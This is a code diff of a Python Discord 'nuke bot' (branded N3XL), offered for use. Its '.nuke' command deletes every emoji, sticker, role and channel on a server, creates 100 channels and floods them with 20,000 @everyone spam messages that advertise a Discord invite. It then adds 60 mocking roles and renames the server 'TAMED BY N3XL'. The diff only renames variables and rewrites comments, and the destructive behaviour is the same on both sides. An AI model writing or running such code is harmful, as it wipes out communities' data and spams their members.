@@ -5,12 +5,12 @@ import random
 import time
 import os
 
-# --- CONFIGURE THESE ---
-BOT_TOKEN = os.getenv("TOKEN", "PUT YOUR BOT TOKEN HERE!")
+# shit you need to change
+TOKEN = os.getenv("TOKEN", "put your token here dummy")
 PREFIX = "."
 
-# Channel names (fancy variants)
-RANDOM_CHANNEL_NAMES = [
+# channel names - fancy bullshit
+CHANNEL_NAMES = [
     "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
     "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
     "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
@@ -21,40 +21,32 @@ RANDOM_CHANNEL_NAMES = [
     "dєstrσчєd",
     "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
 ]
-USE_RANDOM_NAMES = True
-CHANNEL_NAME = "nuked"
 
-# New message content with image
-MESSAGE = """# NUKED BY N3XL 
+# the spam message
+SPAM_MSG = """# NUKED BY N3XL 
 N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
 https://discord.gg/pbtxaTf8Q4
 https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
 ||@everyone|| ||@here||"""
 
-AMOUNT_OF_CHANNELS = 100
-MESSAGES_PER_CHANNEL = 200   # 200 messages per channel
-AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL
+CHANNEL_COUNT = 100
+MSGS_PER_CHANNEL = 200  # 200 messages per channel, total 20k
+TOTAL_MSGS = CHANNEL_COUNT * MSGS_PER_CHANNEL
 
-# Roles to create (base names, will be cycled to make 60 total)
-BASE_ROLE_NAMES = [
+# roles to create
+ROLE_NAMES = [
     "tamed by N3XL",
     "n̾x̾l̾ o̾n̾ t̾o̾p̾",
     "N̶X̶L̶ O̶N̶ T̶O̶P̶",
     "₦ɆӾɆⱠ"
 ]
-AMOUNT_OF_ROLES = 60
+ROLE_COUNT = 60
 
-# New server name
 NEW_SERVER_NAME = "TAMED BY N3XL"
 
-# -----------------------
-# DO NOT MODIFY BELOW
-# -----------------------
-
-def get_channel_name():
-    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
-        return random.choice(RANDOM_CHANNEL_NAMES)
-    return CHANNEL_NAME
+# ----------------------- dont touch below unless u know wtf u doing -----------------------
+def get_chan_name():
+    return random.choice(CHANNEL_NAMES)
 
 intents = discord.Intents.default()
 intents.guilds = True
@@ -64,179 +56,160 @@ intents.emojis_and_stickers = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-async def run_concurrent(tasks, limit=50):
-    sem = asyncio.Semaphore(limit)
-    async def bounded(task):
+async def run_parallel(tasks, concurrency=50):
+    sem = asyncio.Semaphore(concurrency)
+    async def wrapper(t):
         async with sem:
-            return await task
-    return await asyncio.gather(*(bounded(t) for t in tasks), return_exceptions=True)
+            return await t
+    return await asyncio.gather(*(wrapper(t) for t in tasks), return_exceptions=True)
 
-async def delete_emojis(guild):
+async def delete_all_emojis(guild):
     emojis = list(guild.emojis)
-    if not emojis:
-        return
-    print(f"Deleting {len(emojis)} emojis...")
-    tasks = [emoji.delete() for emoji in emojis]
-    await run_concurrent(tasks, 20)
-    print("Emojis deleted.")
+    if not emojis: return
+    print(f"deleting {len(emojis)} emojis")
+    tasks = [e.delete() for e in emojis]
+    await run_parallel(tasks, 20)
+    print("emojis gone")
 
-async def delete_stickers(guild):
+async def delete_all_stickers(guild):
     stickers = list(guild.stickers)
-    if not stickers:
-        return
-    print(f"Deleting {len(stickers)} stickers...")
-    tasks = [sticker.delete() for sticker in stickers]
-    await run_concurrent(tasks, 20)
-    print("Stickers deleted.")
+    if not stickers: return
+    print(f"deleting {len(stickers)} stickers")
+    tasks = [s.delete() for s in stickers]
+    await run_parallel(tasks, 20)
+    print("stickers gone")
 
-async def delete_roles(guild):
+async def delete_all_roles(guild):
     roles = [r for r in guild.roles if r.name != "@everyone"]
-    bot_member = guild.me
-    bot_top_role = bot_member.top_role
-    deletable = []
-    for r in roles:
-        if r >= bot_top_role:
-            print(f"Skipping role {r.name} (higher than bot)")
-            continue
-        deletable.append(r)
-    if not deletable:
-        return
-    print(f"Deleting {len(deletable)} roles...")
-    tasks = [role.delete() for role in deletable]
-    await run_concurrent(tasks, 20)
-    print("Roles deleted.")
+    bot_top = guild.me.top_role
+    deletable = [r for r in roles if r < bot_top]
+    if not deletable: return
+    print(f"deleting {len(deletable)} roles")
+    tasks = [r.delete() for r in deletable]
+    await run_parallel(tasks, 20)
+    print("roles deleted")
 
-async def create_60_roles(guild):
-    print(f"Creating {AMOUNT_OF_ROLES} roles (cycling through base names)...")
+async def create_many_roles(guild):
+    print(f"creating {ROLE_COUNT} roles")
     tasks = []
-    for i in range(AMOUNT_OF_ROLES):
-        base_name = BASE_ROLE_NAMES[i % len(BASE_ROLE_NAMES)]
-        role_name = f"{base_name} {i+1}"
-        tasks.append(guild.create_role(name=role_name, reason="Nuked by N3XEL"))
-    results = await run_concurrent(tasks, 20)
+    for i in range(ROLE_COUNT):
+        name = ROLE_NAMES[i % len(ROLE_NAMES)] + f" {i+1}"
+        tasks.append(guild.create_role(name=name, reason="nuked"))
+    results = await run_parallel(tasks, 20)
     created = [r for r in results if isinstance(r, discord.Role)]
-    print(f"Created {len(created)} roles.")
-    return created
+    print(f"created {len(created)} roles")
 
-async def rename_server(guild):
-    """Rename server with retry and delay"""
-    await asyncio.sleep(5)  # wait a bit after all operations
+async def rename_guild(guild):
+    # wait a bit so discord doesn't rate limit
+    await asyncio.sleep(5)
     try:
-        await guild.edit(name=NEW_SERVER_NAME, reason="Nuked by N3XEL")
-        print(f"✅ Renamed server to {NEW_SERVER_NAME}")
+        await guild.edit(name=NEW_SERVER_NAME, reason="nuked by N3XEL")
+        print(f"server name changed to {NEW_SERVER_NAME}")
     except discord.Forbidden:
-        print("❌ Failed to rename: Bot lacks 'Manage Server' permission. Grant it and re-run .nuke")
+        print("bruh i need 'manage server' permission to rename")
     except discord.HTTPException as e:
         if e.status == 429:
-            print(f"Rate limited on rename, waiting {e.retry_after}s...")
+            print(f"rate limited on rename, waiting {e.retry_after}s")
             await asyncio.sleep(e.retry_after)
             try:
                 await guild.edit(name=NEW_SERVER_NAME)
-                print(f"✅ Renamed server on retry to {NEW_SERVER_NAME}")
-            except Exception as retry_err:
-                print(f"Retry failed: {retry_err}")
+                print(f"renamed on retry")
+            except:
+                print("rename failed even after retry")
         else:
-            print(f"Failed to rename server: {e}")
+            print(f"rename error: {e}")
 
-async def send_messages_fast(channels, message, total):
+async def spam_messages(channels, total_msgs):
     if not channels:
         return
-    semaphore = asyncio.Semaphore(100)  # increased concurrency for 20000 messages
-    async def send_one(channel):
-        async with semaphore:
+    sem = asyncio.Semaphore(100)  # high concurrency for 200 msgs per channel
+    async def send_one(ch):
+        async with sem:
             try:
-                await channel.send(message)
+                await ch.send(SPAM_MSG)
             except discord.HTTPException as e:
                 if e.status == 429:
                     await asyncio.sleep(e.retry_after)
-                    await channel.send(message)
-            except Exception:
+                    await ch.send(SPAM_MSG)
+            except:
                 pass
     tasks = []
-    for i in range(total):
-        channel = channels[i % len(channels)]
-        tasks.append(send_one(channel))
+    for i in range(total_msgs):
+        chan = channels[i % len(channels)]
+        tasks.append(send_one(chan))
     await asyncio.gather(*tasks, return_exceptions=True)
 
-async def nuke_server(guild: discord.Guild):
-    print(f"Starting nuke on {guild.name} ({guild.id})")
-    start_time = time.perf_counter()
+async def nuke(guild):
+    print(f"starting nuke on {guild.name} id {guild.id}")
+    start = time.time()
 
-    # Step 1: Delete emojis, stickers, roles
-    await delete_emojis(guild)
-    await delete_stickers(guild)
-    await delete_roles(guild)
+    # delete emojis, stickers, roles
+    await delete_all_emojis(guild)
+    await delete_all_stickers(guild)
+    await delete_all_roles(guild)
 
-    # Step 2: Delete all channels
-    print("Deleting all channels...")
-    await asyncio.gather(
-        *(channel.delete() for channel in guild.channels),
-        return_exceptions=True
-    )
+    # delete all channels
+    print("deleting all channels")
+    await asyncio.gather(*(c.delete() for c in guild.channels), return_exceptions=True)
 
-    # Step 3: Create new channels
-    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
-    async def create_one():
-        return await guild.create_text_channel(get_channel_name())
-    channels = await asyncio.gather(
-        *(create_one() for _ in range(AMOUNT_OF_CHANNELS)),
-        return_exceptions=True
-    )
-    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
-    print(f"Created {len(text_channels)} channels.")
+    # create new channels
+    print(f"creating {CHANNEL_COUNT} channels")
+    chan_tasks = []
+    for _ in range(CHANNEL_COUNT):
+        name = get_chan_name()
+        chan_tasks.append(guild.create_text_channel(name))
+    results = await asyncio.gather(*chan_tasks, return_exceptions=True)
+    text_chans = [c for c in results if isinstance(c, discord.TextChannel)]
+    print(f"created {len(text_chans)} channels")
 
-    # Step 4: Send messages (200 per channel)
-    if text_channels:
-        print(f"Sending {AMOUNT_OF_MESSAGES} total messages ({MESSAGES_PER_CHANNEL} per channel)...")
-        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)
+    # send 200 messages per channel
+    if text_chans:
+        print(f"sending {TOTAL_MSGS} messages total ({MSGS_PER_CHANNEL} per channel)")
+        await spam_messages(text_chans, TOTAL_MSGS)
 
-    # Step 5: Create 60 roles
-    await create_60_roles(guild)
+    # create roles
+    await create_many_roles(guild)
 
-    # Step 6: Rename server (with retry and delay)
-    await rename_server(guild)
+    # rename server
+    await rename_guild(guild)
 
-    elapsed = time.perf_counter() - start_time
-    print(f"Nuke completed in {elapsed:.2f} seconds!")
+    elapsed = time.time() - start
+    print(f"nuke finished in {elapsed:.2f} seconds")
 
 @bot.event
 async def on_ready():
-    print(f"Bot is online as {bot.user}")
-    print(f"Prefix: {PREFIX}")
-    print(f"Command: {PREFIX}nuke")
-    print("=" * 50)
+    print(f"online as {bot.user}")
+    print(f"prefix {PREFIX}")
+    print(f"command {PREFIX}nuke")
+    print("="*50)
 
 @bot.command(name="nuke")
-async def nuke(ctx):
+async def nuke_cmd(ctx):
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ You need Administrator permission to use this command!")
+        await ctx.send("you need admin perms dumbass")
         return
-    # Double-check bot permissions
+    # check if bot can rename
     me = ctx.guild.me
     if not me.guild_permissions.manage_guild:
-        await ctx.send("ang pogi ko")
-    await ctx.send("eto na putangina")
-    await nuke_server(ctx.guild)
+        await ctx.send("warning: i cant rename the server. give me 'manage server' permission.")
+    await ctx.send("💣 nuking server... 200 msgs per channel, 60 roles, renaming to TAMED BY N3XL")
+    await nuke(ctx.guild)
 
 @bot.command(name="config")
-async def config(ctx):
-    config_msg = f"""
-**Current Configuration:**
-📝 Channel Names: `{len(RANDOM_CHANNEL_NAMES)} variants`
-🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
-💬 Message Preview: `{MESSAGE[:60]}...`
-📊 Channels: `{AMOUNT_OF_CHANNELS}`
-📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
-📨 Total Messages: `{AMOUNT_OF_MESSAGES}`
-👑 New Roles: `{AMOUNT_OF_ROLES} roles (from {', '.join(BASE_ROLE_NAMES)})`
-🏷️ New Server Name: `{NEW_SERVER_NAME}`
+async def config_cmd(ctx):
+    msg = f"""
+**current settings:**
+channels: {CHANNEL_COUNT}
+messages per channel: {MSGS_PER_CHANNEL}
+total messages: {TOTAL_MSGS}
+roles to create: {ROLE_COUNT}
+new server name: {NEW_SERVER_NAME}
     """
-    await ctx.send(config_msg)
+    await ctx.send(msg)
 
 if __name__ == "__main__":
-    if BOT_TOKEN == "PUT YOUR BOT TOKEN HERE!" and not os.getenv("TOKEN"):
-        print("❌ Please set your TOKEN environment variable.")
+    if TOKEN == "put your token here dummy" and not os.getenv("TOKEN"):
+        print("set your token in env var TOKEN or hardcode it")
         exit(1)
-    print("Starting Nuke Bot...")
-    print("=" * 50)
-    bot.run(BOT_TOKEN) 
+    print("starting nuke bot...")
+    bot.run(TOKEN) 
